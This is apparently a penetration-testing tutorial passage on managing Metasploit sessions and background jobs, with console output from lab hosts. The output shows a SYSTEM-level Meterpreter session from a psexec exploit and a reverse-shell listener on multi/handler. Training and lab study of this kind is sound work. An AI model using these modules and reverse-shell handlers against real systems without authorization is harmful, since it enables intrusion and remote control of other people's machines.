`MSFconsole` can manage multiple `modules` simultaneously, offering flexibility during exploitation. This is achieved through the use of `sessions` — dedicated control interfaces for each deployed `module`.

Each `session` represents an active connection or interaction channel between your `Metasploit` environment and a target host, allowing multiple post-exploitation tasks to run concurrently without interference.

---
#### Listing Active Sessions

We can use the `sessions` command to view our currently active sessions.

```bash
msf6 exploit(windows/smb/psexec_psh) > sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
```
#### Interacting with a Session

You can use the `sessions -i [no.]` command to open up a specific session.

```bash
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 
```

---

## Jobs 

`MSFconsole` uses `jobs` to manage background `modules` and `exploit` listeners so occupied `ports` can be freed without improperly killing active `sessions`.

`[CTRL] + [C]` does not reliably free a listening `port`; the background task often remains. Use `jobs` or `jobs -l` to list active background tasks and their Job IDs.

Background an exploit with `exploit -j` (or `exploit -z` when you expect sessions) to avoid blocking the console and create a job. Terminate a specific background job with its Job ID using `jobs -k <JobID>` (or the Metasploit API equivalent).

If a job is tied to a lingering handler, kill the job before reusing the `port` or starting a new `module` that requires it.

#### Viewing the Jobs Command Help Menu

We can view the help menu for this command, like others, by typing `jobs -h`.

```bash
msf6 exploit(multi/handler) > jobs -h
Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S <opt>  Row search filter.
    -h        Help banner.
    -i <opt>  Lists detailed information about a running job.
    -k <opt>  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p <opt>  Add persistence to job by job ID
    -v        Print more detailed info.  Use with -i and -l
```

#### Viewing the Exploit Command Help Menu

When we run an exploit, we can run it as a job by typing `exploit -j`. Per the help menu for the `exploit` command, adding `-j` to our command. Instead of just `exploit` or `run`, will "run it in the context of a job."

```bash
msf6 exploit(multi/handler) > exploit -h
Usage: exploit [options]

Launches an exploitation attempt.

OPTIONS:

    -J        Force running in the foreground, even if passive.
    -e <opt>  The payload encoder to use.  If none is specified, ENCODER is used.
    -f        Force the exploit to run regardless of the value of MinimumRank.
    -h        Help banner.
    -j        Run in the context of a job.
	
<SNIP
```

#### Running an Exploit as a Background Job

```bash
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
```

#### Listing Running Jobs

To list all running jobs, we can use the `jobs -l` command. To kill a specific job, look at the index no. of the job and use the `kill [index no.]` command. Use the `jobs -K` command to kill all running jobs.

```bash
msf6 exploit(multi/handler) > jobs -l

Jobs
====

 Id  Name                    Payload                    Payload opts
 --  ----                    -------                    ------------
 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
```

